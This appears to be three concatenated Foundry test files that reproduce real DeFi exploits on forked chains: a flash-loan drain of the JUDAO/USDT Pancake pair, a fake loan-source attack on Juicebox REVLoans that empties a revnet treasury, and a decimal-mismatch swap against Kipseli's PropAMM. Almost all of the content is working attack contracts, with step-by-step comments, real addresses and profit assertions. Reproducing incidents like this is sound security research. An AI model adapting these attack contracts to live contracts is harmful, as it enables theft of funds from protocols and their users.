// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 205,259.49 USDT + 36 BNB
// Attacker : 0x5384b34c74024d6563b323351a4bbfa18432161b
// Attack Contract : 0x530904b5b5ec86cca0528a682614f57f87e7f079
// Vulnerable Contract : 0xf55dff7898930a2d28cdbc39d615b1624ac86888
// Attack Tx : https://bscscan.com/tx/0x956e38b8ddb40ba080c8042c685ae52ee5c1b096f1d7f0c4a6c59be3eb4265bd

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf55dff7898930a2d28cdbc39d615b1624ac86888#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2955
//
// JUDAO's sell transfer hook drains JUDAO directly from its Pancake pair. The attacker bought JUDAO with
// flash-loaned USDT, sold into the pair to trigger both sync(true) mining and isBurnPair reserve burns,
// then directly swapped the JUDAO balance credited to the pair for excess USDT.

address constant ATTACKER = 0x5384B34C74024d6563B323351a4bBFA18432161B;
address constant JUDAO = 0xf55DFF7898930a2D28cDbC39D615b1624ac86888;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant JUDAO_USDT_PAIR = 0x5D7b61e91cB59E90f7fAE8d0FE2e73976161592F;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);

interface IMoolah {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IJUDAO is IERC20 {
    function basePair() external view returns (address);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 95_070_973;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(JUDAO, "JUDAO");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(JUDAO_USDT_PAIR, "JUDAO/USDT Pancake pair");
        vm.label(MOOLAH, "Moolah flash loan proxy");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 0);
        uint256 usdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 bnbBefore = ATTACKER.balance;

        JUDAOExploit exploit = new JUDAOExploit(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 usdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - usdtBefore;
        uint256 bnbProfit = ATTACKER.balance - bnbBefore;

        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        emit log_named_decimal_uint("Attacker Final BNB Balance", ATTACKER.balance, 18);
        assertGt(usdtProfit, 200_000 ether, "USDT profit");
        assertEq(bnbProfit, 36 ether, "BNB profit");
    }
}

contract JUDAOExploit is IMoolahFlashLoanCallback {
    IJUDAO private constant judao = IJUDAO(JUDAO);
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPancakePair private constant judaoPair = IPancakePair(JUDAO_USDT_PAIR);
    IMoolah private constant moolah = IMoolah(MOOLAH);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);

    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
        usdt.approve(PANCAKE_ROUTER, type(uint256).max);
        usdt.approve(MOOLAH, type(uint256).max);
        judao.approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");
        require(judao.basePair() == JUDAO_USDT_PAIR, "unexpected base pair");
        require(judaoPair.token0() == USDT_TOKEN && judaoPair.token1() == JUDAO, "unexpected token order");

        (, uint112 judaoReserve,) = judaoPair.getReserves();
        uint256 targetJudaoOut = uint256(judaoReserve) / 6;

        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = JUDAO;
        uint256 flashAmount = router.getAmountsIn(targetJudaoOut, buyPath)[0];

        // step 1: borrow enough USDT from Moolah to buy roughly one sixth of JUDAO pair reserves.
        moolah.flashLoan(USDT_TOKEN, flashAmount, "");

        // step 6: mirror the trace by converting exactly 36 BNB, then forward residual USDT.
        address[] memory bnbPath = new address[](2);
        bnbPath[0] = USDT_TOKEN;
        bnbPath[1] = WBNB_TOKEN;
        router.swapTokensForExactETH(36 ether, usdt.balanceOf(address(this)), bnbPath, profitReceiver, block.timestamp);

        usdt.transfer(profitReceiver, usdt.balanceOf(address(this)));
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata
    ) external override {
        require(msg.sender == MOOLAH, "not Moolah");

        // step 2: buy JUDAO; JUDAO's buy branch records this contract's tOwnedU credit.
        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = JUDAO;
        router.swapExactTokensForTokens(assets, 0, buyPath, address(this), block.timestamp);

        // step 3: send the post-fee JUDAO balance to the pair. The token sell hook drains pair reserves.
        uint256 sellAmount = judao.balanceOf(address(this));
        judao.transfer(JUDAO_USDT_PAIR, sellAmount);

        // step 4: directly swap the JUDAO now credited to the pair for USDT using Pancake's 0.25% fee.
        (uint112 reserveUsdt, uint112 reserveJudao,) = judaoPair.getReserves();
        uint256 amountIn = judao.balanceOf(JUDAO_USDT_PAIR) - uint256(reserveJudao);
        uint256 amountOut = getAmountOut(amountIn, uint256(reserveJudao), uint256(reserveUsdt));
        judaoPair.swap(amountOut, 0, address(this), "");

        // step 5: Moolah pulls the flash-loaned principal after this callback returns.
        require(usdt.balanceOf(address(this)) >= assets, "insufficient repayment");
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 9975;
        return (amountInWithFee * reserveOut) / (reserveIn * 10_000 + amountInWithFee);
    }
}


// Source: src/test/2026-04/JuiceboxREVLoans_exp.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 21.77 ETH
// Attacker : 0x23245f620d1e910Ad76E6B6dE4F8284A53C9aD2d
// Attack Contract : EOA direct call; fake source deployed by attacker
// Vulnerable Contract : 0x1880D832aa283d05b8eAB68877717E25FbD550Bb
// Victim : Juicebox revnet #3 treasury in JBMultiTerminal
// Attack Tx : https://etherscan.io/tx/0x9adbd62355eb72b4ff6c58716a503133672ed9317ab930a4c6aa31c7a1a8f938

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x1880D832aa283d05b8eAB68877717E25FbD550Bb#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2046862935650345139
//
// REVLoans registers the caller-supplied loan source the first time borrowFrom() uses it.
// A fake terminal/token can therefore inflate totalBorrowedFrom without paying real assets.
// After registering the fake source, the attacker borrows native ETH from JBMultiTerminal
// with tiny revnet-token collateral and receives the drained treasury ETH.

address constant ATTACKER = 0x23245F620d1e910ad76e6B6De4f8284A53C9Ad2d;
address constant REV_LOANS = 0x1880D832aa283d05b8eAB68877717E25FbD550Bb;
address constant JB_MULTI_TERMINAL = 0x2dB6d704058E552DeFE415753465df8dF0361846;
address constant JB_PERMISSIONS = 0x04fD6913d6c32D8C216e153a43C04b1857a7793d;
address constant NATIVE_TOKEN = 0x000000000000000000000000000000000000EEEe;

uint256 constant REVNET_ID = 3;
uint256 constant PREPAID_FEE_PERCENT = 25;
uint32 constant ETH_CURRENCY = 61_166;
uint8 constant BURN_PERMISSION_ID = 10;

struct REVLoanSource {
    address token;
    address terminal;
}

struct JBPermissionsData {
    address operator;
    uint64 projectId;
    uint8[] permissionIds;
}

struct JBAccountingContext {
    address token;
    uint8 decimals;
    uint32 currency;
}

interface IREVLoans {
    function borrowFrom(
        uint256 revnetId,
        REVLoanSource calldata source,
        uint256 minBorrowAmount,
        uint256 collateralCount,
        address payable beneficiary,
        uint256 prepaidFeePercent
    ) external;

    function totalBorrowedFrom(
        uint256 revnetId,
        address terminal,
        address token
    ) external view returns (uint256);
}

interface IJBMultiTerminal {
    function pay(
        uint256 projectId,
        address token,
        uint256 amount,
        address beneficiary,
        uint256 minReturnedTokens,
        string calldata memo,
        bytes calldata metadata
    ) external payable returns (uint256 beneficiaryTokenCount);
}

interface IJBPermissions {
    function setPermissionsFor(
        address account,
        JBPermissionsData calldata permissionsData
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IREVLoans private constant loans = IREVLoans(REV_LOANS);
    IJBMultiTerminal private constant terminal = IJBMultiTerminal(JB_MULTI_TERMINAL);
    IJBPermissions private constant permissions = IJBPermissions(JB_PERMISSIONS);

    FakeLoanSourceTerminal private fakeSource;

    function setUp() public {
        uint256 forkBlock = 24_917_718;
        vm.createSelectFork("mainnet", forkBlock);
        fakeSource = new FakeLoanSourceTerminal();

        vm.label(ATTACKER, "Attacker");
        vm.label(REV_LOANS, "REVLoans");
        vm.label(JB_MULTI_TERMINAL, "JBMultiTerminal");
        vm.label(JB_PERMISSIONS, "JBPermissions");
        vm.label(address(fakeSource), "LocalFakeLoanSource");
    }

    function testExploit() public {
        uint256 seedAmount = 1 ether;
        uint256 projectTokenPayment = 0.0001 ether;
        vm.deal(ATTACKER, seedAmount);

        uint256 attackerBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);

        // step 1: obtain enough revnet #3 project tokens to post tiny collateral.
        terminal.pay{value: projectTokenPayment}({
            projectId: REVNET_ID,
            token: NATIVE_TOKEN,
            amount: projectTokenPayment,
            beneficiary: ATTACKER,
            minReturnedTokens: 0,
            memo: "",
            metadata: ""
        });

        // step 2: allow REVLoans to burn the attacker's revnet #3 tokens as loan collateral.
        uint8[] memory permissionIds = new uint8[](1);
        permissionIds[0] = BURN_PERMISSION_ID;
        permissions.setPermissionsFor({
            account: ATTACKER,
            permissionsData: JBPermissionsData({
                operator: REV_LOANS, projectId: uint64(REVNET_ID), permissionIds: permissionIds
            })
        });

        // step 3: register a fake source by opening a fake-token loan.
        uint256 fakeSourceCollateral = 22_903_320_800_000_000;
        loans.borrowFrom({
            revnetId: REVNET_ID,
            source: REVLoanSource({token: address(fakeSource), terminal: address(fakeSource)}),
            minBorrowAmount: 0,
            collateralCount: fakeSourceCollateral,
            beneficiary: payable(ATTACKER),
            prepaidFeePercent: PREPAID_FEE_PERCENT
        });
        assertGt(
            loans.totalBorrowedFrom(REVNET_ID, address(fakeSource), address(fakeSource)),
            0,
            "fake source was not registered"
        );

        // step 4: borrow native ETH from the real terminal using the inflated borrowed total.
        uint256 nativeCollateral = 65_301_882_816_341;
        loans.borrowFrom({
            revnetId: REVNET_ID,
            source: REVLoanSource({token: NATIVE_TOKEN, terminal: JB_MULTI_TERMINAL}),
            minBorrowAmount: 0,
            collateralCount: nativeCollateral,
            beneficiary: payable(ATTACKER),
            prepaidFeePercent: PREPAID_FEE_PERCENT
        });

        vm.stopPrank();

        uint256 profit = ATTACKER.balance - attackerBefore;
        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        assertGt(profit, 21 ether, "attacker profit too low");
    }
}

contract FakeLoanSourceTerminal {
    function accountingContextForTokenOf(
        uint256,
        address token
    ) external pure returns (JBAccountingContext memory context) {
        // The historical fake source reported 36 decimals, inflating the recorded fake borrow by 1e18.
        context = JBAccountingContext({token: token, decimals: 36, currency: ETH_CURRENCY});
    }

    function useAllowanceOf(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        address payable,
        address,
        string calldata
    ) external pure returns (uint256) {
        return amount;
    }

    function transfer(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function decimals() external pure returns (uint8) {
        return 36;
    }

    function allowance(
        address,
        address
    ) external pure returns (uint256) {
        return 0;
    }

    function approve(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function pay(
        uint256,
        address,
        uint256,
        address,
        uint256,
        string calldata,
        bytes calldata
    ) external payable returns (uint256) {
        return 0;
    }
}


// Source: src/test/2026-04/KipseliPropAMM_exp.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.93 cbBTC
// Attacker : 0x2352a1fca90182509dca9c12b2cad582a38e8b82
// Attack Contract : 0x74513519689b1fb427747624a4dd87b3849d39cd
// Vulnerable Contract : 0xd35c6717cca1e04696b694dcb1643ac3620d2152
// Attack Tx : https://basescan.org/tx/0x96edeeb3d49d7a54c60d227bedce5bf64df5d52effd9fd80334175a9553db3bb

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xd35c6717cca1e04696b694dcb1643ac3620d2152#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2046873857571934254
//
// Kipseli's PropAMM route accepted WETH -> cbBTC and produced a USDC-scale quote. The returned integer
// was transferred as cbBTC units, turning a roughly 92 USDC quote into about 0.926 cbBTC.

address constant ATTACKER = 0x2352a1FcA90182509dCa9c12B2CAd582a38E8b82;
address constant PROP_AMM_WRAPPER = 0xd35C6717cCa1E04696B694DCb1643Ac3620D2152;
address constant CBBTC_HOLDER = 0xBEE3211ab312a8D065c4FeF0247448e17A8da000;
IWETH constant WETH_TOKEN = IWETH(payable(0x4200000000000000000000000000000000000006));
IERC20 constant CBBTC_TOKEN = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

interface IPropAMMWrapper {
    function quote(
        address tokenIn,
        uint256 amountIn,
        address tokenOut
    ) external view returns (uint256 amountOut);
    function swap(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 minOutAmount,
        address recipient
    ) external returns (uint256 amountOut);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 45_008_654;
        vm.createSelectFork("base", forkBlock);
        vm.roll(45_008_655);
        vm.warp(1_776_806_657);

        fundingToken = address(CBBTC_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker / profit receiver");
        vm.label(PROP_AMM_WRAPPER, "Kipseli PropAMMWrapper");
        vm.label(CBBTC_HOLDER, "Kipseli cbBTC holder");
        vm.label(address(WETH_TOKEN), "WETH");
        vm.label(address(CBBTC_TOKEN), "cbBTC");
    }

    function testExploit() public balanceLog {
        uint256 amountIn = 0.04 ether;
        uint256 minimumImpact = 90_000_000; // 0.9 cbBTC, using cbBTC's 8 decimals.
        uint256 attackerBefore = CBBTC_TOKEN.balanceOf(ATTACKER);
        uint256 holderBefore = CBBTC_TOKEN.balanceOf(CBBTC_HOLDER);

        KipseliAttack localAttack =
            new KipseliAttack(PROP_AMM_WRAPPER, address(WETH_TOKEN), address(CBBTC_TOKEN), ATTACKER);
        vm.label(address(localAttack), "Local attack contract");

        // step 1: fund the local attack contract through the historical profit receiver.
        deal(ATTACKER, amountIn);
        vm.prank(ATTACKER, ATTACKER);
        (uint256 quotedAmount, uint256 receivedAmount) = localAttack.run{value: amountIn}();

        // step 2: prove the quote is USDC-scale, then prove it was received as cbBTC units.
        assertGt(quotedAmount, minimumImpact, "quote was not in the exploitable scale");
        assertGt(receivedAmount, minimumImpact, "attacker did not receive cbBTC-scale output");

        // step 3: preserve the observed final forwarding path from attack contract to attacker.
        uint256 attackerGain = CBBTC_TOKEN.balanceOf(ATTACKER) - attackerBefore;
        assertEq(attackerGain, receivedAmount, "local attack did not forward cbBTC to attacker");

        // step 4: prove impact against the same cbBTC holder that funded the receipt transfer.
        uint256 holderLoss = holderBefore - CBBTC_TOKEN.balanceOf(CBBTC_HOLDER);
        assertEq(holderLoss, receivedAmount, "cbBTC holder loss did not match attacker gain");
        emit log_named_decimal_uint("cbBTC gained through decimal mismatch", attackerGain, 8);
    }
}

contract KipseliAttack {
    IPropAMMWrapper private immutable wrapper;
    IWETH private immutable weth;
    IERC20 private immutable cbbtc;
    address private immutable receiver;

    constructor(
        address wrapper_,
        address weth_,
        address cbbtc_,
        address receiver_
    ) {
        wrapper = IPropAMMWrapper(wrapper_);
        weth = IWETH(payable(weth_));
        cbbtc = IERC20(cbbtc_);
        receiver = receiver_;
    }

    function run() external payable returns (uint256 quotedAmount, uint256 receivedAmount) {
        uint256 amountIn = msg.value;

        // step 1: mirror the historical attack contract wrapping ETH into WETH.
        weth.deposit{value: amountIn}();
        require(weth.approve(address(wrapper), amountIn), "approve failed");

        // step 2: use the verified wrapper ABI instead of raw attacker calldata.
        quotedAmount = wrapper.quote(address(weth), amountIn, address(cbbtc));
        uint256 minOutAmount = 1; // Historical tx input set the wrapper swap minimum to one token unit.
        uint256 beforeBalance = cbbtc.balanceOf(address(this));
        wrapper.swap(address(weth), amountIn, address(cbbtc), minOutAmount, address(this));
        receivedAmount = cbbtc.balanceOf(address(this)) - beforeBalance;

        // step 3: forward profit to the historical tx sender / final receiver.
        require(cbbtc.transfer(receiver, receivedAmount), "cbBTC transfer failed");
    }

    receive() external payable {}
}


